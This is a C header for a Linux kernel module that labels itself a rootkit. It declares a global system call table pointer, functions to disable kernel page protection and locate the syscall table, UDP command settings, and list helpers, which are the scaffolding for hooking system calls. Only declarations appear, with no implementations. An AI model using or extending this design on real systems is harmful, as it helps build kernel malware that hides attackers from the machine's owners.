#ifndef INCLUDE_H
#define INCLUDE_H

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/mutex.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>

/*
 * global variables
 */

/* global system call table pointer */
extern void **table_ptr;

/* global debugger */
#define DEBUG_ENABLED 1

/* ip lengths */
#define IPV4_LENGTH 4
#define IPV6_LENGTH 16

/* udp settings */
#define UDP_PORT 8071
#define SYS_PORT 514
#define UDP_BUFF 128

/* command settings */
#define PID_MAX_DIGIT 8
#define SOC_MAX_DIGIT 8
#define PR0TCL_LENGTH 4
#define LOPORT_LENGTH 5
#define IP_MAX_LENGTH INET6_ADDRSTRLEN

/*
 * global structs 
 */

/* 
 * struct data_node: universal doubly-linked list node for all modules
 * maybe in the future: make list generic with #define
 */
struct data_node {
	/* pointer to data */
	void *data;
	/* list to previous and next entry */
	struct data_node *prev, *next;
};

/*
 * global functions
 */

/* debugger functions */

/* variadic macro for debug messages */
#define debug(str, ...) 					\
if (DEBUG_ENABLED) {			 			\
	pr_info("[ ROOTKIT_MODULE ] [ %s ] " str "\n", 		\
		__func__, ##__VA_ARGS__); 			\
}

#define alert(str, ...) 					\
if (DEBUG_ENABLED) { 						\
	pr_warn("[ ROOTKIT_MODULE ] [ %s ] " str "\n", 		\
		__func__, ##__VA_ARGS__); 			\
}

/* list functions */

/* check if list is empty */
int is_empty_data_node(struct data_node **head);

/* find node with specific content in data */
struct data_node *find_data_node(struct data_node **head, void *data, 
	int length);

/* find node with specific field in data (used for structs) */
struct data_node *find_data_node_field(struct data_node **head, void *needle, 
	int offset, int length);

/* insert node at the end of the current list */
struct data_node *insert_data_node(struct data_node **head, void *data);

/* delete node */
void delete_data_node(struct data_node **head, struct data_node *node);

/* call a function for each node */
void foreach_data_node_callback(struct data_node **head, 
	void (*callback_function)(struct data_node *));

/* completely free a list */
void free_data_node_list(struct data_node **head);

/* completely free a list with callback function */
void free_data_node_list_callback(struct data_node **head, 
	void (*callback_function)(struct data_node *));

/* critical section functions (mutexes) */

/* increment counter of a critical section */
void inc_critical(struct mutex *lock, int *counter);

/* decrement counter of a critical section */
void dec_critical(struct mutex *lock, int *counter);

/* simple util functions */

/* disable page protection */
void disable_page_protection(void);

/* enable page protection */
void enable_page_protection(void);

/* set pointer to system call table */
int set_syscalltable(void);

/* strtoint: convert char *str containing a number into an integer */
int strtoint(char *str);

/* getdigits: get number of digits for a given int */
int getdigits(int num);

#endif